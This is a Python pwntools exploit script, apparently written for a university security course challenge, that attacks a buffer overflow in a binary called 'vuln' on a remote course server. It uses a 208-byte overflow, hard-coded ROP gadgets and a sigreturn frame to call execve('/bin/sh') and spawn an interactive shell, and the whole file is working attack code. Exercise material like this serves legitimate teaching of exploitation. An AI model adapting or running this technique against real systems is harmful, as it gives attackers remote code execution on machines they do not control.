#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33595)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

# Pie is off, this makes live easy :)
shell_string = next(exe.search(b'/bin/sh\x00'))
print(hex(shell_string))

# I want to execute the following shellcode:
"""
mov rax, 59
moc rdi, 0x402029
mov rsi, 0
mov rdx, 0
syscall
"""

pop_rax_gadget = 0x00000000004010b3 # pop rax; ret; 
syscall_gadget = 0x0000000000401010 # syscall;

# first we execute the syscall "SIGRETURN" (15) to setup the 4 register, then we just return to syscall again to get a shell :)

# rop.execve(next(binary.search('/bin/sh'), 0, 0))
# one more line, see slides exercise 3

frame = pwn.SigreturnFrame()
frame.rax = 59
frame.rdi = shell_string
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget

rop = pwn.ROP(exe)

rop.raw(pop_rax_gadget)
rop.raw(15)
rop.raw(syscall_gadget)
rop.raw(bytes(frame))


payload = b'A' * 208 + rop.chain()

print(f'payload length: {len(payload)}')

conn.send(payload)

conn.interactive()


